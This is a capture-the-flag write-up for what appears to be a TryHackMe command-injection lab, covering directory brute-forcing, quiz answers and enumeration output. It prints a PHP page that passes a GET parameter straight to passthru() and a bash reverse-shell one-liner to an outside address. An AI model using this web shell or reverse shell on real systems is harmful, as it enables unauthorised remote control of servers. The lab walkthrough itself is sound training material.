@@ -1,0 +1,103 @@
+A very interesting one goes here. The server started on http://10.10.22.242/
+I start off by doing a directory bruteforce : 
+└─# gobuster dir -u http://10.10.22.242/ -w /usr/share/wordlists/directory-list-2.3-medium.txt -e php -z
+There is a PHP script here -> http://10.10.22.242/evilshell.php. It utilizes the php passthru() function which is allowing commands to run and echoes back the result
+on the browser. The code here, obtained after I spawned a shell 
+
+<?php
+
+                    if (isset($_GET["commandString"])) {
+                        $command_string = $_GET["commandString"];
+                        
+                        try {
+                            passthru($command_string);
+                        } catch (Error $error) {
+                            echo "<p class=mt-3><b>$error</b></p>";
+                        }
+                    }
+                        
+                ?>
+
+
+And so am tempted to try a reverse shell command here.
+bash -c 'bash -i >& /dev/tcp/10.9.0.177/9001 0>&1'
+
+and boom we I have spawned a session as www-data
+
+www-data@injection:/var/www/html$ whoami
+whoami
+www-data
+www-data@injection:/var/www/html$ ls
+ls
+css
+drpepper.txt
+evilshell.php
+index.php
+js
+www-data@injection:/var/www/html$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+I want to know more, what does the drpepper.txt contain?
+www-data@injection:/var/www/html$ cat drpepper.txt
+cat drpepper.txt
+I love Dr Pepper
+
+That may become useful later. For now, let me go /home
+There is no logon users so the box is just designed to learn command injection. So below I focus on the quizzes.
+''''
+#1 What strange text file is in the website root directory?
+www-data@injection:/var/www/html$ ls  
+drpepper.txt
+#2 How many non-root/non-service/non-daemon users are there?
+0
+#3 What user is this app running as?
+www-data@injection:/$ whoami
+www-data
+#4 What is the user's shell set as?
+www-data@injection:/$ echo "$SHELL"
+/usr/sbin/nologin
+#5 What version of Ubuntu is running?
+www-data@injection:/$ lsb_release -a 
+No LSB modules are available.
+Distributor ID:	Ubuntu
+Description:	Ubuntu 18.04.4 LTS
+Release:	18.04
+Codename:	bionic
+#6 Print out the MOTD.  What favorite beverage is shown? -> DR PEPPER
+
+www-data@injection:/$ cat /etc/update-motd.d/00-header
+
+#!/bin/sh
+#
+#    00-header - create the header of the MOTD
+#    Copyright (C) 2009-2010 Canonical Ltd.
+#
+#    Authors: Dustin Kirkland <kirkland@canonical.com>
+#
+#    This program is free software; you can redistribute it and/or modify
+#    it under the terms of the GNU General Public License as published by
+#    the Free Software Foundation; either version 2 of the License, or
+#    (at your option) any later version.
+#
+#    This program is distributed in the hope that it will be useful,
+#    but WITHOUT ANY WARRANTY; without even the implied warranty of
+#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#    GNU General Public License for more details.
+#
+#    You should have received a copy of the GNU General Public License along
+#    with this program; if not, write to the Free Software Foundation, Inc.,
+#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
+
+[ -r /etc/lsb-release ] && . /etc/lsb-release
+
+if [ -z "$DISTRIB_DESCRIPTION" ] && [ -x /usr/bin/lsb_release ]; then
+	# Fall back to using the very slow lsb_release utility
+	DISTRIB_DESCRIPTION=$(lsb_release -s -d)
+fi
+
+printf "Welcome to %s (%s %s %s)\n" "$DISTRIB_DESCRIPTION" "$(uname -o)" "$(uname -r)" "$(uname -m)"
+
+DR PEPPER MAKES THE WORLD TASTE BETTER!
+
+This was a good refresher and absolute fun! Thanks to TryHackMe
